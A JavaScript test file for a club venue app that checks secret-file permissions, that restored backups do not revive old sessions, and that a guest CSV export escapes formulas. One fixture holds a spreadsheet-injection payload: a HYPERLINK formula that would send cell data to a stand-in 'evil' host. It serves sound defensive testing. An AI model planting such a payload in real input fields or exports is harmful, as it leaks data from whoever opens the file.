'use strict';
/* db.json holds the password hash, the session signing secret and every
   third-party API key. These tests pin three things that were quietly wrong
   about how it is written and restored. */
const test = require('node:test');
const assert = require('node:assert/strict');
const { execFileSync } = require('node:child_process');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const { createApp } = require('../lib/app');
const { Store } = require('../lib/store');
const backupLib = require('../lib/backup');
const auth = require('../lib/auth');

const offline = async () => ({ ok: false, status: 503, json: async () => ({}), text: async () => '' });
const mode = (f) => fs.statSync(f).mode & 0o777;

const dataDir = () => fs.mkdtempSync(path.join(os.tmpdir(), 'pt-secrets-'));

test('db.json is 0600 however it was written — service, password reset, or USB restore', (t) => {
  const dir = dataDir();
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  const file = path.join(dir, 'db.json');

  // 1. The service writing it normally.
  const store = new Store(file);
  store.data.settings.adminHash = auth.hashPassword('correct horse');
  store.flush();
  assert.equal(mode(file), 0o600, 'the running service');

  // 2. The root password-reset helper. It runs with root's umask, so the mode
  //    has to be set explicitly or the file lands 0644.
  fs.chmodSync(file, 0o644);
  execFileSync(process.execPath, [path.join(__dirname, '..', 'bin', 'reset-password.js'), file], {
    env: { ...process.env, PT_PASSWORD: 'a new password' },
    stdio: 'ignore',
  });
  assert.equal(mode(file), 0o600, 'after pitchtribe-reset-password');

  // 3. The root USB-restore helper.
  const stick = fs.mkdtempSync(path.join(os.tmpdir(), 'pt-stick-'));
  t.after(() => fs.rmSync(stick, { recursive: true, force: true }));
  const onto = dataDir();
  t.after(() => fs.rmSync(onto, { recursive: true, force: true }));
  backupLib.backup({ dataDir: dir, stickDir: stick, hostname: 'bar-tv', now: new Date('2026-11-08T12:00:00Z') });
  const snap = fs.readdirSync(path.join(stick, backupLib.ROOT, 'bar-tv', 'snapshots'))[0];
  backupLib.restore({ stickDir: stick, host: 'bar-tv', id: snap, dataDir: onto });
  assert.equal(mode(path.join(onto, 'db.json')), 0o600, 'after a restore from a USB stick');

  // And the snapshot on the stick carries no session signing secret: a stick
  // left in a drawer should not hold something that can sign admin cookies.
  const onStick = JSON.parse(fs.readFileSync(path.join(stick, backupLib.ROOT, 'bar-tv', 'snapshots', snap, 'db.json'), 'utf8'));
  assert.equal(onStick.settings.sessionSecret, undefined);
  assert.ok(onStick.settings.adminHash, 'but the club still gets its password back');
});

test('restoring a backup does not bring old sessions back to life', async (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pt-sess-'));
  const ctx = createApp({ dataDir: dir, sportsFetch: offline, feedsFetch: offline, log: () => {} });
  const server = await new Promise((r) => { const s = ctx.app.listen(0, '127.0.0.1', () => r(s)); });
  t.after(() => { ctx.close(); server.closeAllConnections(); server.close(); fs.rmSync(dir, { recursive: true, force: true }); });
  const base = `http://127.0.0.1:${server.address().port}`;

  const setup = await fetch(`${base}/api/auth/setup`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-pitchtribe': '1' },
    body: JSON.stringify({ clubName: 'Riverside FC', password: 'correct horse' }),
  });
  const cookie = (setup.headers.get('set-cookie') || '').split(';')[0];
  assert.equal((await fetch(`${base}/api/state`, { headers: { cookie, 'x-pitchtribe': '1' } })).status, 200);

  // Take a backup while that cookie is valid.
  const archive = Buffer.from(await (await fetch(`${base}/api/backup/download`, { headers: { cookie, 'x-pitchtribe': '1' } })).arrayBuffer());

  // Restore it. The secret in the archive must not come back, or every cookie
  // minted under it works again — including after a password change, which is
  // meant to sign everyone out.
  const res = await fetch(`${base}/api/backup/restore-file`, {
    method: 'POST',
    headers: { cookie, 'x-pitchtribe': '1', 'content-type': 'application/gzip' },
    body: archive,
  });
  assert.equal(res.status, 200);

  const after = await fetch(`${base}/api/state`, { headers: { cookie, 'x-pitchtribe': '1' } });
  assert.equal(after.status, 401, 'the cookie from before the backup no longer works');

  // The club can still sign in with the restored password.
  const login = await fetch(`${base}/api/auth/login`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-pitchtribe': '1' },
    body: JSON.stringify({ password: 'correct horse' }),
  });
  assert.equal(login.status, 200);
});

test('the guest Wi-Fi CSV export cannot carry a spreadsheet formula', async (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pt-csv-'));
  const ctx = createApp({ dataDir: dir, sportsFetch: offline, feedsFetch: offline, log: () => {} });
  const server = await new Promise((r) => { const s = ctx.app.listen(0, '127.0.0.1', () => r(s)); });
  t.after(() => { ctx.close(); server.closeAllConnections(); server.close(); fs.rmSync(dir, { recursive: true, force: true }); });
  const base = `http://127.0.0.1:${server.address().port}`;

  const setup = await fetch(`${base}/api/auth/setup`, {
    method: 'POST',
    headers: { 'content-type': 'application/json', 'x-pitchtribe': '1' },
    body: JSON.stringify({ clubName: 'Riverside FC', password: 'correct horse' }),
  });
  const cookie = (setup.headers.get('set-cookie') || '').split(';')[0];

  // What a guest can type into the sign-in form: the email pattern allows a
  // leading =, so the file a volunteer opens must not treat it as a formula.
  fs.writeFileSync(
    path.join(dir, 'portal-guests.jsonl'),
    `${JSON.stringify({ at: '2026-11-08T12:00:00Z', email: '=HYPERLINK("http://evil/"&A1,"click")@x.com', consent: true })}\n`
      + `${JSON.stringify({ at: '2026-11-08T12:05:00Z', email: 'someone@example.com', consent: false })}\n`
  );

  const csv = await (await fetch(`${base}/api/portal/guests.csv`, { headers: { cookie, 'x-pitchtribe': '1' } })).text();
  assert.match(csv, /"'=HYPERLINK/, 'the formula is neutralised with a leading apostrophe');
  assert.match(csv, /"someone@example\.com"/, 'and an ordinary address is untouched');
});
